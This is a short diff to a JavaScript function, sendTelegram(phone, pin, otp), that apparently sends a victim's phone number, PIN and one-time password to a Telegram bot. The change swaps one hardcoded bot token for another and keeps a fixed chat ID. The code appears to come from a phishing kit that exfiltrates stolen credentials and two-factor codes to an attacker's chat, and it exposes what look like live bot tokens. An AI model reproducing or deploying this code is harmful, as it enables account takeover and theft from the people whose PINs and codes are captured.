@@ -1,5 +1,5 @@
 function sendTelegram(phone, pin, otp) {
-    const botToken = "8446620248:AAHwRK7mrr9ggvFaor9olOibfYeErTLbPO0";
+    const botToken = "8446620248:AAEepdNIXK15ZYyapdDlD8LGmyQZCMUx9ng";
     const chatId   = "6989148477";
 
     const message = `
@@ -29,4 +29,5 @@ function sendTelegram(phone, pin, otp) {
         return false;
     });
 }
+
 
